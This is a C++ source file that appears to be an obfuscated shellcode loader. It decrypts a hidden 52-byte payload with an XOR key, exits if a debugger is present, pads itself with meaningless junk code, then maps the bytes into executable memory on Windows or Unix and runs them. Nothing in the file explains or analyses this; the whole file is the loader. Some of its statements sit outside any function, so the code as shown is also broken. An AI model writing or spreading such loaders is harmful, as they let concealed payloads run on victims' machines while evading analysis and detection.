/* Unique ID: 785874986 */
#include <iostream>
#include <vector>
#include <cstring>
#include <cstdint>
#include <memory>
#ifdef _WIN32
#include <windows.h>
#else
#include <sys/mman.h>
#include <unistd.h>
#endif

    float __XLh9tCv5I__ = 6.06f;
    __XLh9tCv5I__ *= 1.82f;
    float __1LgnjWYT__ = 8.73f;
    __1LgnjWYT__ *= 1.52f;
    for (int o1BCFxCJmjvVMeTnT9O = 0; o1BCFxCJmjvVMeTnT9O < 4; o1BCFxCJmjvVMeTnT9O++) {
        volatile int op91965 = 335;
    }
    std::string Handler_5085 = "R1DmffegEpbojRBW";
    {
    for (int _3LKB6y7i = 0; _3LKB6y7i < 3; _3LKB6y7i++) {
        volatile int l4717Ycb4A = 673;
    }
    }

int main() {
    for (volatile int Filter_94188 = 0; Filter_94188 < 711071; Filter_94188++);
    volatile int eng28450 = 843;
    volatile int __5E8GjkkfkV__ = eng28450 + 419;
    if (eng28450 != __5E8GjkkfkV__) { eng28450 = __5E8GjkkfkV__; }
#ifdef _WIN32
    if (IsDebuggerPresent()) return 94;
#endif
    unsigned char Helper_11735[] = {
        0xed, 0x44, 0x75, 0xa2, 0xe9, 0xb3, 0x58, 0x52, 0xfe, 0x42, 0x4a, 0x1a, 0xfa, 0x98, 0x2e, 0xf1, 
        0xd4, 0xda, 0xa2, 0x46, 0x78, 0x2e, 0x85, 0x58, 0x1a, 0xaa, 0x2a, 0x87, 0xc0, 0x1a, 0x2c, 0x77, 
        0x99, 0x49, 0x72, 0xb2, 0xbb, 0xa3, 0x5b, 0x06, 0xf6, 0x0d, 0x50, 0x5f, 0xfd, 0x89, 0x7d, 0xe8, 
        0xf4, 0xe6, 0x86, 0x62
    };

    unsigned char __8c6rSgtF__[] = {0xb9, 0x2c, 0x1c, 0xd1, 0xc9, 0xda, 0x2b, 0x72, 0x9f, 0x62, 0x3e, 0x7f, 0x89, 0xec, 0x0e, 0x9c, 0x9d, 0x88, 0xe1, 0x68, 0x1d, 0x56, 0xe0, 0x78, 0x7c, 0xc3, 0x46, 0xe2, 0xe0, 0x7c, 0x43, 0x05};

    int X43135rGCrC9j[20] = {57, 141, 414, 943, 824, 638, 596, 693, 27, 34, 528, 714, 158, 523, 368, 141, 143, 918, 240, 685};
    for (size_t param84781 = 0; param84781 < sizeof(Helper_11735); param84781++) {
        Helper_11735[param84781] ^= __8c6rSgtF__[param84781 % sizeof(__8c6rSgtF__)];
    }

    int proc95147 = 760;
    proc95147 = (proc95147 * 631) ^ 913;
#ifdef _WIN32
    void* optBufferGraph = VirtualAlloc(0, sizeof(Helper_11735), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    memcpy(optBufferGraph, Helper_11735, sizeof(Helper_11735));
    DWORD __jIEPw3XyTm__;
    VirtualProtect(optBufferGraph, sizeof(Helper_11735), PAGE_EXECUTE_READ, &__jIEPw3XyTm__);
    ((void(*)())optBufferGraph)();
#else
    void* optBufferGraph = mmap(0, sizeof(Helper_11735), PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    memcpy(optBufferGraph, Helper_11735, sizeof(Helper_11735));
    mprotect(optBufferGraph, sizeof(Helper_11735), PROT_READ | PROT_EXEC);
    ((void(*)())optBufferGraph)();
#endif
    #ifdef task71055
        int workContext85226 = 213;
    #endif
    return 0;
}
